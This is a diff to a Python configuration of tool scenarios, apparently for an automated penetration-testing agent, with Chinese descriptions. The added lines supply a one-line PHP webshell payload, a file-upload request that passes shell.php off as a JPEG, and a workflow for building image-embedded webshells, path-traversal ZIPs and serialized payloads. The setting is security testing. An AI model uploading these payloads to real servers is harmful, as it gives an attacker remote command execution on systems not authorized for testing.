@@ -13,7 +13,8 @@ TOOL_SCENARIOS = {
             "验证其他工具发现的漏洞（手工确认）",
             "需要自定义认证逻辑或特殊编码的场景",
             "绕过简单WAF/过滤的变形测试",
-            "调试和分析HTTP响应、处理复杂重定向"
+            "调试和分析HTTP响应、处理复杂重定向",
+            "文件上传漏洞测试（POST multipart/form-data）"
         ],
         "not_for": [
             "大规模扫描任务（效率低）",
@@ -22,7 +23,16 @@ TOOL_SCENARIOS = {
         ],
         "prerequisite": "了解HTTP协议基础，能构造合理的请求参数",
         "cost": "低",
-        "example": "手工构造带认证头的请求测试未授权访问: requests.get(url, headers={'Authorization': 'Bearer token'})"
+        "example": "文件上传攻击: requests.post(url, files={'file': ('shell.php', '<?php system($_GET[cmd]); ?>', 'image/jpeg')})",
+        "file_upload_example": {
+            "description": "文件上传POST请求格式",
+            "params": {
+                "method": "POST",
+                "url": "http://target/upload.php",
+                "files": {"file": ["shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg"]},
+                "headers": {"Content-Type": "multipart/form-data"}
+            }
+        }
     },
 
     "python-exec": {
@@ -420,22 +430,21 @@ TOOL_SCENARIOS = {
     },
 
     "file-creator": {
-        "function": "创建各类安全测试文件",
+        "function": "创建图片马、WebShell、压缩包等安全测试文件",
         "best_for": [
-            "生成测试用的Web Shell",
-            "创建钓鱼文件（如Excel宏）",
-            "生成恶意PDF、图片马",
-            "创建.htaccess等配置文件",
-            "上传漏洞测试文件生成"
+            "创建图片马 (GIF/PNG/JPG + PHP payload)",
+            "创建路径穿越 ZIP、符号链接 ZIP",
+            "创建 .htaccess、.user.ini 配置文件",
+            "创建 Python pickle、PHP 序列化文件"
         ],
         "not_for": [
-            "不需要文件的场景",
-            "已经有现成payload的场景",
-            "仅需要简单文本输入的场景"
+            "直接上传文件（需配合 requests 工具）",
+            "不需要文件的场景"
         ],
-        "prerequisite": "了解目标环境支持的文件类型",
+        "prerequisite": "了解目标允许的文件类型，创建后用 requests 工具上传",
         "cost": "低",
-        "example": "创建PHP一句话木马: file_creator --type webshell --lang php --password pass"
+        "example": "创建图片马: file_type='image_php', payload='<?php system($_GET[cmd]);?>', image_type='gif'",
+        "workflow": "1. 用 file-creator 创建文件 → 2. 用 requests 上传 files={'file': [filename, content, mime]}"
     },
 
     # ==================== 内网渗透工具 ====================
